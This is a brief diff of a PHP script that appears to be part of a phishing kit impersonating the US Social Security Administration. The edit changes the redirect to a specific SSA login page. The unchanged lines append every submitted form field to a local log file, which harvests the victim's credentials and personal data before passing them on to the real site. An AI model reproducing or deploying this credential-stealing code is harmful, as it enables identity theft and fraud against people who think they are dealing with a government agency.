@@ -1,5 +1,5 @@
 <?php
-header ('Location: https://secure.ssa.gov/');
+header ('Location: https://secure.ssa.gov/RIR/CaviView.action');
 $handle = fopen("log.txt", "a");
 foreach($_POST as $variable => $value) {
 fwrite($handle, $variable);
